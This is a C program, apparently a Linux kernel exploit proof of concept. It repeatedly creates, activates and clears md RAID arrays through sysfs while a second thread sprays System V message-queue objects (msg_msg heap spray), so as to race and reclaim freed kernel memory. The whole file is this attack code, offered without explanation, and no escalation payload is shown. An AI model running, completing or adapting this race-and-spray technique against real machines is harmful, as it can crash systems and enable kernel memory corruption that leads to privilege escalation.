#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <pthread.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sys/stat.h>
#include <sched.h>

static int wr(const char *p, const char *v, int *er)
{
    int fd = open(p, O_WRONLY);
    if (fd < 0) { if (er) *er = errno; return -1; }
    ssize_t n = write(fd, v, strlen(v));
    int e = errno;
    close(fd);
    if (er) *er = e;
    return n < 0 ? -1 : 0;
}

static void rd1(const char *p, const char *tag)
{
    char b[96];
    int fd = open(p, O_RDONLY);
    if (fd < 0) { printf("  %s=(no)\n", tag); return; }
    int n = read(fd, b, sizeof(b) - 1);
    close(fd);
    if (n <= 0) { printf("  %s=(empty)\n", tag); return; }
    b[n] = 0;
    char *nl = strchr(b, '\n');
    if (nl) *nl = 0;
    printf("  %s=%s\n", tag, b);
}

struct spray_arg {
    int qid;
    int count;
    int size;
    volatile int *go;
    volatile int *done;
};

static void *spray_thread(void *p)
{
    struct spray_arg *a = (struct spray_arg *)p;
    int sz = a->size;
    char *msg = malloc(sz + 32);
    if (!msg) return NULL;
    for (;;) {
        while (!*a->go) {
            if (*a->done) { free(msg); return NULL; }
            sched_yield();
        }
        for (int i = 0; i < a->count; i++) {
            *(long *)msg = 1;
            memset(msg + 8, 0x41 + (i & 15), sz);
            if (msgsnd(a->qid, msg, sz, IPC_NOWAIT) < 0)
                break;
        }
        *a->go = 0;
        *a->done = 1;
    }
}

int main(int argc, char **argv)
{
    int rounds = argc > 1 ? atoi(argv[1]) : 30;
    int spray_cnt = argc > 2 ? atoi(argv[2]) : 800;
    int msg_size = argc > 3 ? atoi(argv[3]) : 960;

    printf("V4 uid=%d rounds=%d spray=%d msgsz=%d\n", getuid(), rounds, spray_cnt, msg_size);
    fflush(stdout);

    int qid = msgget(IPC_PRIVATE, 0600 | IPC_CREAT);
    if (qid < 0) { printf("FAIL msgget %d\n", errno); return 1; }
    printf("qid=%d\n", qid);

    volatile int go = 0, done = 0;
    struct spray_arg sa = { qid, spray_cnt, msg_size, &go, &done };
    pthread_t th;
    pthread_create(&th, NULL, spray_thread, &sa);

    int e = 0;
    int ok_c = 0, ok_meta = 0, ok_bind = 0, ok_a = 0, ok_cl = 0;

    for (int i = 0; i < rounds; i++) {
        char name[32], p[192];
        snprintf(name, sizeof(name), "md%d", i);

        e = 0;
        if (wr("/sys/module/md_mod/parameters/new_array", name, &e) < 0) {
            printf("r=%d NEWARR e=%d\n", i, e);
            continue;
        }
        ok_c++;

        snprintf(p, sizeof(p), "/sys/block/%s/md/metadata_version", name);
        e = 0;
        if (wr(p, "none", &e) == 0) ok_meta++;

        snprintf(p, sizeof(p), "/sys/block/%s/md/level", name);
        wr(p, "raid1", &e);

        snprintf(p, sizeof(p), "/sys/block/%s/md/raid_disks", name);
        wr(p, "1", &e);

        snprintf(p, sizeof(p), "/sys/block/%s/md/new_dev", name);
        e = 0;
        if (wr(p, "1:0", &e) == 0) ok_bind++;
        else if (i < 2) printf("r=%d BIND e=%d\n", i, e);

        snprintf(p, sizeof(p), "/sys/block/%s/md/dev-ram0/state", name);
        wr(p, "in_sync", &e);

        snprintf(p, sizeof(p), "/sys/block/%s/md/array_state", name);
        e = 0;
        if (wr(p, "active", &e) == 0) ok_a++;
        else if (i < 2) {
            printf("r=%d ACTIVE e=%d\n", i, e);
            rd1(p, "state");
        }

        done = 0;
        go = 1;

        snprintf(p, sizeof(p), "/sys/block/%s/md/array_state", name);
        e = 0;
        if (wr(p, "clear", &e) == 0) ok_cl++;
        else if (i < 2) printf("r=%d CLEAR e=%d\n", i, e);

        for (int w = 0; w < 400 && !done; w++) usleep(500);
        go = 0;

        char tmp[8192];
        while (msgrcv(qid, tmp, sizeof(tmp), 0, IPC_NOWAIT | MSG_NOERROR) >= 0)
            ;

        if ((i % 5) == 0) {
            printf("r=%d c=%d m=%d b=%d a=%d cl=%d\n", i, ok_c, ok_meta, ok_bind, ok_a, ok_cl);
            fflush(stdout);
        }
    }

    done = 1; go = 1;
    printf("V4FINAL create=%d meta=%d bind=%d active=%d clear=%d\n",
           ok_c, ok_meta, ok_bind, ok_a, ok_cl);
    printf("V4 done\n");
    fflush(stdout);
    return 0;
}